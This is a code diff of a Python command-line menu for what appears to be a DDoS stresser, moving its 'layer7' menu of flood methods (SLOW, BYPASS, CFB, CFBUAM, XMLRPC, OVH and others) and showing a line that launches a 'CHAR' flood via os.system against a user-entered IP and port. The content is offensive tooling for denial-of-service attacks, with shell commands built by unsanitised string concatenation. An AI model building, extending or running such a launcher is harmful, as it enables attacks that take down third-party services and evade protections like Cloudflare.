@@ -55,9 +55,27 @@ if input1 == "layer4":
 ║ CHAR.                                                 ║                   
 ║                                                       ║
 ╚═══════════════════════════════════════════════════════╝""")
-layer4input = input("""
+    
+    layer4input = input("""
 ╔══════[root@watermelon]
 ╚═══> """)
+    
+if input1 == "layer7":
+       print("""  
+╔═══════════════════════════════════════════════════════╗
+║                                                       ║
+║                       Methods:                        ║ 
+║  SLOW, DOWNLOADER, BYPASS, DYN, PPS, HEAD, APACHE,    ║
+║  KILLER, CFB, COOKIE, BOMB, EVEN, TOR, DGB, NULL,     ║
+║  OVH, AVB, POST, XMLRPC, GET, CFBUAM, BOT, STRESS, GSB║                                            
+║                                                       ║
+╚═══════════════════════════════════════════════════════╝""")
+    
+    layer7input = input("""
+╔══════[root@watermelon]
+╚═══> """)
+
+
 if layer4input == "MINECRAFT":
     ip = input(f"ip ══ ")
     port = input(f"port ══ ")
@@ -167,19 +185,19 @@ if layer4input == "CHAR":
     os.system("cd files/dont_look && python3 start.py CHAR " + ip + ":" + port + " 1000 " + timeudp)
 
 #layer7
-if input1 == "layer7":
-       print("""  
-╔═══════════════════════════════════════════════════════╗
-║                                                       ║
-║                       Methods:                        ║ 
-║  SLOW, DOWNLOADER, BYPASS, DYN, PPS, HEAD, APACHE,    ║
-║  KILLER, CFB, COOKIE, BOMB, EVEN, TOR, DGB, NULL,     ║
-║  OVH, AVB, POST, XMLRPC, GET, CFBUAM, BOT, STRESS, GSB║                                            
-║                                                       ║
-╚═══════════════════════════════════════════════════════╝""")
-layer7input = input("""
-╔══════[root@watermelon]
-╚═══> """)
+#if input1 == "layer7":
+#       print("""  
+#╔═══════════════════════════════════════════════════════╗
+#║                                                       ║
+#║                       Methods:                        ║ 
+#║  SLOW, DOWNLOADER, BYPASS, DYN, PPS, HEAD, APACHE,    ║
+#║  KILLER, CFB, COOKIE, BOMB, EVEN, TOR, DGB, NULL,     ║
+#║  OVH, AVB, POST, XMLRPC, GET, CFBUAM, BOT, STRESS, GSB║                                            
+#║                                                       ║
+#╚═══════════════════════════════════════════════════════╝""")
+#layer7input = input("""
+#╔══════[root@watermelon]
+#╚═══> """)
 
 if layer7input == "SLOW":
     url = input(f"url ══ ")
